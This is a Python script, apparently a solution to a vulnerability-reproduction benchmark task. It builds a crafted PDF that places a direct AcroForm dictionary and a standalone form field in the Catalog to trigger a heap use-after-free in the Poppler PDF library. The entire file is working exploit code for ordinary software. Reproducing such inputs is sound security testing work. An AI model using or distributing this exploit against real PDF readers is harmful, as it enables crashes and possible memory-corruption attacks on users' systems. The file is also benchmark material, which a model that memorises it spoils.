class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Poppler.
        
        The vulnerability exists in the destruction of standalone forms where passing a Dict
        to Object() does not increase the reference count properly. This typically happens
        when the AcroForm is a direct dictionary inside the Catalog, rather than an
        indirect object reference.
        """
        
        # Start constructing the PDF
        pdf = bytearray(b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n")
        
        # We need to create objects and track their byte offsets for the xref table.
        # Structure:
        # 1. Catalog: Contains a DIRECT AcroForm dictionary (the trigger).
        # 2. Pages: Standard pages tree.
        # 3. Field: A standalone form field (referenced by AcroForm but not a page annotation).
        # 4. Page: A standard page.
        # 5. Font: A basic font resource.
        
        objects = []
        
        # Object 1: Catalog
        # The key is /AcroForm << ... >> (Direct Dictionary)
        # This causes the Form constructor to wrap the raw Dict pointer without proper ref counting in vulnerable versions.
        acroform_dict = b"<< /Fields [ 3 0 R ] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 5 0 R >> >> >>"
        obj1_content = b"<< /Type /Catalog /Pages 2 0 R /AcroForm " + acroform_dict + b" >>"
        objects.append((1, obj1_content))
        
        # Object 2: Pages
        obj2_content = b"<< /Type /Pages /Kids [ 4 0 R ] /Count 1 >>"
        objects.append((2, obj2_content))
        
        # Object 3: Standalone Field
        # Referenced in AcroForm /Fields, but not in Page /Annots
        obj3_content = b"<< /FT /Tx /T (PwnField) /V (Crash) >>"
        objects.append((3, obj3_content))
        
        # Object 4: Page
        obj4_content = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>"
        objects.append((4, obj4_content))
        
        # Object 5: Font
        obj5_content = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
        objects.append((5, obj5_content))
        
        # Write objects to PDF body and record offsets
        offsets = {}
        for oid, content in objects:
            offsets[oid] = len(pdf)
            pdf.extend(f"{oid} 0 obj\n".encode('latin-1'))
            pdf.extend(content)
            pdf.extend(b"\nendobj\n")
            
        # Write Cross-Reference Table (xref)
        xref_offset = len(pdf)
        pdf.extend(b"xref\n")
        pdf.extend(f"0 {len(objects) + 1}\n".encode('latin-1'))
        pdf.extend(b"0000000000 65535 f \n")
        
        for i in range(1, len(objects) + 1):
            off = offsets[i]
            pdf.extend(f"{off:010d} 00000 n \n".encode('latin-1'))
            
        # Write Trailer
        pdf.extend(b"trailer\n")
        pdf.extend(f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode('latin-1'))
        pdf.extend(b"startxref\n")
        pdf.extend(f"{xref_offset}\n".encode('latin-1'))
        pdf.extend(b"%%EOF\n")
        
        return bytes(pdf)
